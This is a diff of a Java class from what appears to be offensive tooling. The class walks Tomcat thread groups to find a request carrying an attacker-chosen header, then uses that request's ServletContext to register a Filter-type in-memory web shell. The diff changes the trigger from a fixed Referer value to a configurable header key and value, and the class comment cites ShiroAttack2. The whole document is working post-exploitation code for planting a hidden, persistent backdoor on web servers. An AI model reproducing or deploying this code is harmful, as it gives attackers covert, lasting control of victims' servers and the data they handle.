@@ -15,7 +15,7 @@ import java.util.EnumSet;
 import java.util.List;
 
 /**
- * 遍历线程组，在 request 中查找带有特定 Referer 的请求，并从 request 获取 ServletContext 添加 Filter 型内存马
+ * 遍历线程组，在 request 中查找带有特定 Header 的请求，并从 request 获取 ServletContext 添加 Filter 型内存马
  * 添加成功后，会回显 Success 字样，参考 ShiroAttack2
  *
  * @author su18
@@ -28,7 +28,9 @@ public class TFMSFromRequest implements Filter {
 
 	public static String pattern;
 
-	public static String referer;
+	public static String HEADER_KEY;
+
+	public static String HEADER_VALUE;
 
 	static {
 		getRequestAndResponse();
@@ -60,9 +62,9 @@ public class TFMSFromRequest implements Filter {
 							for (int j = 0; j < processors.size(); ++j) {
 								Object processor = processors.get(j);
 								target = getFieldValue(processor, "req");
-								Object req        = target.getClass().getMethod("getNote", Integer.TYPE).invoke(target, new Integer(1));
-								String reqReferer = (String) req.getClass().getMethod("getHeader", String.class).invoke(req, new String("Referer"));
-								if (reqReferer != null && !reqReferer.isEmpty() && reqReferer.equals(referer)) {
+								Object req   = target.getClass().getMethod("getNote", Integer.TYPE).invoke(target, new Integer(1));
+								String value = (String) req.getClass().getMethod("getHeader", String.class).invoke(req, new String(HEADER_KEY));
+								if (value != null && value.contains(HEADER_VALUE)) {
 									request = (HttpServletRequest) req;
 									try {
 										response = (HttpServletResponse) getFieldValue(getFieldValue(req, "request"), "response");
